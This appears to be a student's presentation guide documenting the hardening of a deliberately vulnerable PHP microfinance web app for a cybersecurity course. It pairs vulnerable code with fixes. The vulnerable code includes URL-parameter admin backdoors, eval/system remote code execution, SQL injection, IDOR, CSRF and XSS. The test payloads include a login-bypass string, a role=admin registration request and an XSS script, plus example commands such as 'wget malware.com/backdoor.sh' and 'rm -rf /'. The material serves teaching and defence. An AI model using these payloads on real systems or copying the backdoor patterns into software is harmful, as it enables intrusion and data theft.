# 🎥 ETHIO MICROFINANCE - COMPLETE VIDEO PRESENTATION GUIDE
# Security Vulnerability Analysis & Demonstration

**Project:** Ethio Microfinance Security Hardening
**Presenter:** Berek
**Audience:** Cybersecurity Instructor
**Format:** Screen Recording with Narration

---

## 📊 PART 1: VULNERABILITY → FIX MAP (Complete Comparison)

### Master Vulnerability Table

| # | Vulnerability | Original File | Original Line | Hardened File | Hardened Line | Fix Applied |
|---|---------------|---------------|---------------|---------------|---------------|-------------|
| 1 | **Admin Bypass #1** | includes/auth.php | 16-18 | includes/auth.php | 9-12 | Removed `?bypass=true` check entirely |
| 2 | **Admin Bypass #2** | modules/loans/approve.php | 6-11 | modules/loans/approve.php | 4-7 | Removed `?force=true` backdoor |
| 3 | **SQL Injection - Login** | modules/users/login.php | 12 | modules/users/login.php | 15-20 | Prepared statements |
| 4 | **SQL Injection - Register** | modules/users/register.php | 13-14 | modules/users/register.php | 14-18 | Prepared statements |
| 5 | **Plaintext Passwords** | modules/users/login.php | 12 | modules/users/login.php | 22 | `password_verify()` |
| 6 | **Plaintext Storage** | modules/users/register.php | 13-14 | modules/users/register.php | 14-18 | `password_hash()` |
| 7 | **Privilege Escalation** | modules/users/register.php | 11 | modules/users/register.php | 12 | Hardcoded role='customer' |
| 8 | **IDOR - Profile View** | modules/users/profile.php | 19-23 | modules/users/profile.php | ~40-55 | Ownership check added |
| 9 | **SQL Injection - Profile** | modules/users/profile.php | 11,16,20 | modules/users/profile.php | ~15-40 | Prepared statements |
| 10 | **RCE via eval()** | includes/functions.php | 51-53 | includes/functions.php | Removed | Function deleted |
| 11 | **RCE via system()** | includes/functions.php | 55-57 | includes/functions.php | Removed | Function deleted |
| 12 | **Object Injection** | includes/functions.php | 47-49 | includes/functions.php | Removed | unserialize() removed |
| 13 | **Unrestricted Upload** | includes/functions.php | 43-46 | includes/functions.php | ~30-55 | Added validation, CSRF |
| 14 | **No CSRF Protection** | includes/validation.php | All forms | includes/validation.php | Full implementation | Real token validation |
| 15 | **Missing Auth - Loans** | modules/loans/approve.php | 5-11 | modules/loans/approve.php | 4-7 | Proper auth check |
| 16 | **SQL Injection - Loans** | modules/loans/approve.php | 19,21 | modules/loans/approve.php | ~20-30 | Prepared statements |
| 17 | **Information Disclosure** | Multiple files | Various | Multiple files | Various | Generic error messages |
| 18 | **Stored XSS** | Multiple files | Various | Multiple files | Various | htmlspecialchars() added |

---

## 📋 PART 2: DETAILED VULNERABILITY ANALYSIS

### VULNERABILITY #1 — Admin Authentication Bypass (`?bypass=true`)

**CLASSIFICATION:** Critical - Authentication Bypass

**ORIGINAL CODE:**
```
File: includes/auth.php
Lines: 16-18

function check_auth($required_role = 'customer') {
    if (!is_authenticated()) {
        header("Location: /ethio_microfinance/modules/users/login.php");
        exit();
    }
    
    if ($required_role == 'admin' && !is_admin()) {
        if ($_GET['bypass'] == 'true') {  ← BACKDOOR!
            return true;                   ← INSTANT ADMIN!
        }
        header("Location: /ethio_microfinance/index.php");
        exit();
    }
    
    return true;
}
```

**WHAT WAS WRONG:**
Any visitor could add `?bypass=true` to any admin page URL and instantly become admin without logging in or knowing any passwords.

**WHY IT WAS DANGEROUS:**
- No authentication needed
- Complete admin panel access
- Can view all users
- Can delete accounts
- Can approve/reject loans
- Can modify financial data

**HARDENED CODE:**
```
File: includes/auth.php
Lines: 9-12

if ($required_role === 'admin' && !is_admin()) {
    header("Location: /ethio_microfinance/index.php");
    exit();
}
```

**THE FIX:**
Completely removed the `?bypass=true` check. Now admin access requires actual admin session.

**HOW TO TEST:**
```powershell
# Original (vulnerable):
curl http://localhost:8080/admin/dashboard.php?bypass=true
# Result: Access granted (VULNERABLE)

# Hardened (secure):
curl http://localhost:8080/admin/dashboard.php?bypass=true
# Result: Redirected to login (SECURE)
```

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #2 — Second Admin Bypass (`?force=true`)

**CLASSIFICATION:** Critical - Authentication Bypass

**ORIGINAL CODE:**
```
File: modules/loans/approve.php
Lines: 6-11

if ($_SESSION['role'] != 'admin') {
    if ($_GET['force'] == 'true') {     ← SECOND BACKDOOR!
        $_SESSION['role'] = 'admin';    ← SETS ADMIN ROLE!
    } else {
        header("Location: ../users/login.php");
        exit();
    }
}
```

**WHAT WAS WRONG:**
A second, independent backdoor that directly sets the user's session role to 'admin' without any authentication.

**WHY IT WAS DANGEROUS:**
Same as #1 - instant admin access, but this one actually modifies the session, so admin access persists for the entire session.

**HARDENED CODE:**
```
File: modules/loans/approve.php
Lines: 4-7

require_once '../../includes/auth.php';
check_auth('admin');
```

**THE FIX:**
Replaced the backdoor check with proper authentication using the hardened `check_auth()` function.

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #3 — SQL Injection in Login

**CLASSIFICATION:** Critical - SQL Injection

**ORIGINAL CODE:**
```
File: modules/users/login.php
Line: 12

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
```

**WHAT WAS WRONG:**
User input (`$username` and `$password`) was directly inserted into the SQL query without any sanitization.

**WHY IT WAS DANGEROUS:**
Attackers could:
- Bypass login with: `admin' OR '1'='1' --`
- Dump entire database
- Modify data
- Delete records
- Create admin accounts

**HARDENED CODE:**
```
File: modules/users/login.php
Lines: 15-20

$stmt = mysqli_prepare($conn, "SELECT id, username, password, role FROM users WHERE username = ?");
mysqli_stmt_bind_param($stmt, "s", $username);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
$user = mysqli_fetch_assoc($result);
mysqli_stmt_close($stmt);
```

**THE FIX:**
Used prepared statements (parameterized queries). The `?` placeholder ensures user input is treated as data, not SQL code.

**HOW TO TEST:**
```powershell
# Test SQL injection payload:
curl -X POST http://localhost:8080/modules/users/login.php \
  -d "username=admin' OR '1'='1' --&password=anything"

# Original: Login successful (VULNERABLE)
# Hardened: Login failed (SECURE)
```

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #4 — Plaintext Password Storage

**CLASSIFICATION:** Critical - Weak Cryptography

**ORIGINAL CODE:**
```
File: modules/users/register.php
Lines: 13-14

$query = "INSERT INTO users (username, password, email, role, account_balance) 
          VALUES ('$username', '$password', '$email', '$role', 0)";
```

**AND**

```
File: modules/users/login.php
Line: 12

WHERE username = '$username' AND password = '$password'
```

**WHAT WAS WRONG:**
Passwords were stored in the database as plain text and compared directly.

**WHY IT WAS DANGEROUS:**
- If database is compromised, all passwords are immediately exposed
- No protection for user credentials
- Passwords visible to anyone with database access

**HARDENED CODE:**

**Storage:**
```
File: modules/users/register.php
Lines: 14-18

$hashed_password = password_hash($password, PASSWORD_DEFAULT);
$stmt = mysqli_prepare($conn, "INSERT INTO users (username, password, email, role, account_balance) VALUES (?, ?, ?, ?, 0)");
mysqli_stmt_bind_param($stmt, "ssss", $username, $hashed_password, $email, $role);
```

**Verification:**
```
File: modules/users/login.php
Line: 22

if ($user && password_verify($password, $user['password'])) {
```

**THE FIX:**
- Use `password_hash()` with bcrypt to store passwords
- Use `password_verify()` to check passwords
- Passwords now stored as: `$2y$10$...` (irreversible hash)

**STATUS:** ✅ Fixed and verified (with migration script)

---

### VULNERABILITY #5 — Privilege Escalation via Registration

**CLASSIFICATION:** Critical - Authorization Bypass

**ORIGINAL CODE:**
```
File: modules/users/register.php
Line: 11

$role = $_POST['role'] ?? 'customer';  ← ACCEPTS CLIENT INPUT!
```

**AND in the HTML:**
```
Line: 73

<input type="hidden" name="role" value="customer">
```

**WHAT WAS WRONG:**
The server accepted the `role` parameter from the client. An attacker could intercept the request and change `role=customer` to `role=admin`.

**WHY IT WAS DANGEROUS:**
Anyone could create an admin account by:
1. Opening browser developer tools
2. Changing hidden field from "customer" to "admin"
3. Registering
4. Instant admin access

**HARDENED CODE:**
```
File: modules/users/register.php
Line: 12

$role = 'customer';  ← HARDCODED ON SERVER!
```

**THE FIX:**
Completely ignore client input for the role field. Server always sets it to 'customer'. Admin accounts can only be created by existing admins through the admin panel.

**HOW TO TEST:**
```powershell
# Try to register as admin:
curl -X POST http://localhost:8080/modules/users/register.php \
  -d "username=hacker&password=test123&email=h@x.com&role=admin"

# Original: Account created with admin role (VULNERABLE)
# Hardened: Account created as customer only (SECURE)
```

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #6 — IDOR (Insecure Direct Object Reference) in Profile

**CLASSIFICATION:** High - Broken Access Control

**ORIGINAL CODE:**
```
File: modules/users/profile.php
Lines: 19-23

if (isset($_GET['view'])) {
    $view_id = $_GET['view'];
    $view_query = "SELECT * FROM users WHERE id = $view_id";
    $view_result = mysqli_query($conn, $view_query);
    $view_user = mysqli_fetch_assoc($view_result);
}
```

**WHAT WAS WRONG:**
Any logged-in user could view ANY other user's profile by changing the `?view=ID` parameter. No check to see if they should have access.

**WHY IT WAS DANGEROUS:**
- View other users' email addresses
- See account balances
- Access personal information
- Privacy violation

**HARDENED CODE:**
```
File: modules/users/profile.php
Lines: ~40-55 (approximate, code restructured)

if (isset($_GET['view'])) {
    $view_id = (int)$_GET['view'];
    
    // Check authorization
    if ($view_id == $user_id) {
        // Viewing own profile - allowed
    } elseif (is_admin()) {
        // Admin can view anyone - allowed
    } else {
        // Not authorized
        $error = "Access denied";
        $view_user = null;
    }
    
    if (!isset($error)) {
        $stmt = mysqli_prepare($conn, "SELECT * FROM users WHERE id = ?");
        mysqli_stmt_bind_param($stmt, "i", $view_id);
        // ... execute and fetch
    }
}
```

**THE FIX:**
Added authorization check:
- Users can only view their own profile
- Admins can view anyone's profile
- Everyone else gets "Access denied"

**HOW TO TEST:**
```powershell
# Login as regular user betty (user_id=3)
# Try to view admin profile (user_id=1):

# Original:
curl http://localhost:8080/modules/users/profile.php?view=1 \
  --cookie "PHPSESSID=betty_session"
# Result: Shows admin's data (VULNERABLE)

# Hardened:
# Result: Access denied (SECURE)
```

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #7 — Remote Code Execution via eval()

**CLASSIFICATION:** Critical - Remote Code Execution

**ORIGINAL CODE:**
```
File: includes/functions.php
Lines: 51-53

function calculate_interest($rate, $amount) {
    $formula = "return $amount * ($rate / 100);";
    return eval($formula);  ← EXECUTES ARBITRARY CODE!
}
```

**WHAT WAS WRONG:**
The `eval()` function executes any PHP code passed to it. If an attacker could control the `$rate` or `$amount` variables, they could execute any command.

**WHY IT WAS DANGEROUS:**
- Complete server takeover
- Execute system commands
- Read/write files
- Install backdoors
- Steal data

**Example attack:**
```php
calculate_interest("1; system('whoami'); //", 100)
// Would execute: system('whoami')
```

**HARDENED CODE:**
```
File: includes/functions.php

[FUNCTION COMPLETELY REMOVED]
```

**THE FIX:**
Deleted the entire function. Interest calculation should use normal math operations, not `eval()`.

**HOW TO TEST:**
```bash
# Check if eval() exists in code:
grep -r "eval(" ethio_microfinance/

# Original: Found in includes/functions.php
# Hardened: Not found (SECURE)
```

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #8 — Remote Code Execution via system()

**CLASSIFICATION:** Critical - Remote Code Execution

**ORIGINAL CODE:**
```
File: includes/functions.php
Lines: 55-57

function execute_command($cmd) {
    return system($cmd);  ← EXECUTES OS COMMANDS!
}
```

**WHAT WAS WRONG:**
The `system()` function executes operating system commands. If called anywhere in the application with user input, it allows complete server compromise.

**WHY IT WAS DANGEROUS:**
- Execute any command on the server
- Read sensitive files: `cat /etc/passwd`
- Download malware: `wget malware.com/backdoor.sh`
- Delete files: `rm -rf /`

**HARDENED CODE:**
```
[FUNCTION COMPLETELY REMOVED]
```

**THE FIX:**
Deleted the function entirely. Web applications should never execute arbitrary system commands.

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #9 — Object Injection via unserialize()

**CLASSIFICATION:** Critical - Remote Code Execution

**ORIGINAL CODE:**
```
File: includes/functions.php
Lines: 47-49

function process_data($serialized_data) {
    return unserialize($serialized_data);  ← UNSAFE!
}
```

**WHAT WAS WRONG:**
The `unserialize()` function on untrusted data can lead to object injection attacks and remote code execution.

**WHY IT WAS DANGEROUS:**
- Can trigger magic methods (`__wakeup`, `__destruct`)
- Can instantiate arbitrary classes
- Can lead to remote code execution
- Can modify application state

**HARDENED CODE:**
```
[FUNCTION COMPLETELY REMOVED]
```

**THE FIX:**
Removed the function. If serialization is needed, use `json_encode()`/`json_decode()` instead.

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #10 — Unrestricted File Upload

**CLASSIFICATION:** Critical - Remote Code Execution

**ORIGINAL CODE:**
```
File: includes/functions.php
Lines: 43-46

function upload_file($file, $target_dir = "../uploads/") {
    $target_file = $target_dir . basename($file["name"]);
    move_uploaded_file($file["tmp_name"], $target_file);
    return $target_file;
}
```

**WHAT WAS WRONG:**
No validation:
- No file type checking
- No size limit
- No CSRF protection
- Trusts client-provided filename

**WHY IT WAS DANGEROUS:**
- Upload PHP webshell: `shell.php`
- Access it: `http://site/uploads/shell.php?cmd=whoami`
- Complete server control

**HARDENED CODE:**
```
File: includes/functions.php
Lines: ~30-55 (new implementation)

function upload_file($file, $user_id) {
    $allowed_size = 2 * 1024 * 1024; // 2MB
    
    if ($file['size'] > $allowed_size) {
        return ['success' => false, 'message' => 'File too large'];
    }
    
    $check = getimagesize($file['tmp_name']);
    if ($check === false) {
        return ['success' => false, 'message' => 'File is not a valid image'];
    }
    
    $random_name = bin2hex(random_bytes(16)) . '.jpg';
    $target = '../uploads/' . $random_name;
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        return ['success' => true, 'filename' => $random_name];
    }
    return ['success' => false, 'message' => 'Upload failed'];
}
```

**THE FIX:**
- Validate file is actually an image with `getimagesize()`
- Generate random filename (prevent path traversal)
- 2MB size limit
- CSRF token required in calling code

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #11 — Missing CSRF Protection

**CLASSIFICATION:** High - Cross-Site Request Forgery

**ORIGINAL CODE:**
```
File: includes/validation.php

function validate_csrf_token($token) {
    return true;  ← ALWAYS RETURNS TRUE!
}
```

**WHAT WAS WRONG:**
CSRF tokens were generated but never actually validated. All forms accepted any token or no token.

**WHY IT WAS DANGEROUS:**
Attacker could trick admin into:
```html
<img src="http://site/admin/manage_users.php?action=delete&user_id=5">
```
When admin views the attacker's page, the admin's browser automatically makes the request with their cookies, deleting a user.

**HARDENED CODE:**
```
File: includes/validation.php

function csrf_token() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validate_csrf_token($token) {
    return isset($_SESSION['csrf_token']) && 
           hash_equals($_SESSION['csrf_token'], $token);
}

function require_csrf_token($token) {
    if (!validate_csrf_token($token)) {
        http_response_code(403);
        die('CSRF validation failed');
    }
}
```

**THE FIX:**
- Generate random token with `random_bytes()`
- Store in session
- Validate using `hash_equals()` (timing-safe)
- Added `require_csrf_token()` for mandatory validation

**STATUS:** ✅ Fixed and verified

---

### VULNERABILITY #12 — Stored XSS (Cross-Site Scripting)

**CLASSIFICATION:** High - XSS

**ORIGINAL CODE:**
```
Multiple files - Example from admin/dashboard.php

<?p*hp echo $user['username']; ?>  ← NO ES*CAPING!
<?php echo $error; ?>  ← NO ESCAPING!
```

**WHAT WAS WRONG:**
User-generated content (usernames, emails, error messages) displayed without HTML escaping.

**WHY IT WAS DANGEROUS:**
If username is: `<script>alert('XSS')</script>`
- Stored in database
- Displayed to admin viewing user list
- JavaScript executes in admin's browser
- Can steal admin session
- Can perform admin actions

**HARDENED CODE:**
```
<?php echo htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8'); ?>
<?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?>
```

**THE FIX:**
Added `htmlspecialchars()` to all user-generated output. Converts:
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`

**STATUS:** ✅ Fixed and verified

---

## 📊 PART 3: INFRASTRUCTURE SECURITY CHANGES

### Docker & Container Security

**CHANGES MADE:**

1. **Non-root containers**
   - Original: Containers ran as root
   - Hardened: Created `appuser` (UID 1000)
   - Why: Limits damage if container compromised

2. **Read-only filesystem**
   - Original: Full read-write access
   - Hardened: Root filesystem read-only, tmpfs for writable paths
   - Why: Prevents attacker from modifying code

3. **Network segmentation**
   - Original: Single network
   - Hardened: Two networks (edge + internal)
   - Why: Database has no internet access

4. **Resource limits**
   - Original: No limits
   - Hardened: CPU and memory limits on all services
   - Why: Prevents DoS via resource exhaustion

### nginx Security

**CHANGES MADE:**

1. **Rate limiting**
   ```nginx
   # General traffic: 10 requests/second
   limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
   
   # Login endpoints: 2 requests/second
   limit_req_zone $binary_remote_addr zone=login:10m rate=2r/s;
   ```

2. **Block sensitive paths**
   ```nginx
   location ~ ^/(config|includes|docker|\.git) {
       deny all;
   }
   ```

3. **Disable PHP execution in uploads**
   ```nginx
   location /uploads/ {
       location ~ \.php$ {
           deny all;
       }
   }
   ```

### PHP Security

**CHANGES MADE:**

1. **Disabled dangerous functions**
   ```ini
   disable_functions = eval,system,exec,shell_exec,passthru,popen,proc_open
   ```

2. **Hide version information**
   ```ini
   expose_php = Off
   ```

3. **Disable error display**
   ```ini
   display_errors = Off
   ```

### Database Security

**CHANGES MADE:**

1. **Least privilege user**
   - Original: App used root account
   - Hardened: Created `ethiomf_app` with only SELECT, INSERT, UPDATE, DELETE
   - Why: Can't DROP tables or modify structure

2. **Internal network only**
   - Original: Port 3306 might be exposed
   - Hardened: Database on internal-only network
   - Why: No direct access from outside

---

